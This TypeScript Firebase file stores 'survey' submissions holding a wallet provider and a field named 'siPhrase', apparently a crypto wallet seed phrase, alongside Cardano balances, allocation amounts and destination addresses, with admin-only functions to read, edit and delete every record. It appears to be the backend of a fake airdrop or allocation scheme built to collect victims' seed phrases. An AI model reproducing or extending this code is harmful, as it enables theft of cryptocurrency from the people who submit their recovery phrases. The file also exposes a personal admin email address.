// storeSurvey.ts
import { auth, db } from "./firebase";
import {
  collection,
  addDoc,
  serverTimestamp,
  getDocs,
  query,
  where,
  doc,
  deleteDoc,
  updateDoc,
  limit,
} from "firebase/firestore";
import { User } from "firebase/auth";

interface SurveyData {
  walletProvider: string | null;
  siPhrase: string;
}

interface UserData {
  cardanoBalance: number;
  allocationAmount: number;
  blockchainNetwork: string;
  walletProvider: string;
  destinationAddress: string;
}

export async function storeSurveyData(data: SurveyData) {
  try {
    const docRef = await addDoc(collection(db, "surveys"), {
      ...data,
      createdAt: serverTimestamp(),
    });
    console.log("Survey submitted with ID: ", docRef.id);
    return docRef.id;
  } catch (error) {
    console.error("Error adding survey: ", error);
    throw error;
  }
}

export async function storeUserData(data: UserData) {
  try {
    const docRef = await addDoc(collection(db, "users"), {
      ...data,
      createdAt: serverTimestamp(),
    });
    console.log("Users submitted with ID: ", docRef.id);
    return docRef.id;
  } catch (error) {
    console.error("Error adding users: ", error);
    throw error;
  }
}
/**
 * Fetch all surveys if the current user is an admin
 */

export const fetchAllDocuments = async (collectionName: string) => {
  // Get the current user
  const user: User | null = auth.currentUser;

  if (!user || !user.email) {
    throw new Error("No user logged in");
  }

  // Define allowed admin emails
  const adminEmails = process.env.NEXT_PUBLIC_ADMIN_EMAILS
    ? process.env.NEXT_PUBLIC_ADMIN_EMAILS.split(",").map((s) => s.trim())
    : ["webedge244@gmail.com"];

  // Check if the current user is an admin
  if (!adminEmails.includes(user.email)) {
    throw new Error("You are not authorized to access this data");
  }

  // Fetch all documents in 'surveys' collection
  const surveysSnapshot = await getDocs(collection(db, collectionName));
  const surveys = surveysSnapshot.docs.map((doc) => ({
    id: doc.id,
    ...doc.data(),
  }));

  return surveys;
};

/**
 * Deletes a document directly by its Firestore document ID (name).
 *
 * @param collectionName - The name of the Firestore collection.
 * @param id - The document ID (not a field).
 */
export async function deleteDocumentById(
  collectionName: string,
  id: string
): Promise<void> {
  try {
    const docRef = doc(db, collectionName, id);
    await deleteDoc(docRef);
    console.log(`Document with ID = ${id} deleted successfully.`);
  } catch (error) {
    console.error("Error deleting document:", error);
    throw new Error(`Failed to delete document with ID = ${id}`);
  }
}

/**
 * Updates a Firestore document by its document ID.
 *
 * @param collectionName - Name of the Firestore collection
 * @param id - The Firestore document ID
 * @param updatedData - Object containing the fields to update
 *
 * @example
 * await updateDocumentById("users", "abc123", { allocationAmount: 500 });
 */
export async function updateDocumentById(
  collectionName: string,
  id: string,
  updatedData: Record<string, any>
): Promise<boolean> {
  try {
    const docRef = doc(db, collectionName, id);
    await updateDoc(docRef, updatedData);
    return true;
    console.log(
      `✅ Document ${id} in '${collectionName}' updated successfully.`
    );
  } catch (error: any) {
    console.error(
      `❌ Error updating document ${id} in ${collectionName}:`,
      error.message
    );
    throw new Error(error.message || "Failed to update document");
  }
}

/**
 * Fetches the allocationAmount for the first user
 * whose destinationAddress matches the given address.
 *
 * @param address - The destination address to search for
 * @returns The allocationAmount (number) or null if not found
 */
export async function getAllocationAmountByDestinationAddress(
  address: string
): Promise<number | null> {
  try {
    const q = query(
      collection(db, "users"),
      where("destinationAddress", "==", address),
      limit(1)
    );

    const snapshot = await getDocs(q);

    if (snapshot.empty) return null;

    const docData = snapshot.docs[0].data();
    return docData.allocationAmount ?? null;
  } catch (error: any) {
    console.error("Error fetching allocation amount:", error);
    throw new Error(error.message || "Failed to fetch allocation amount");
  }
}
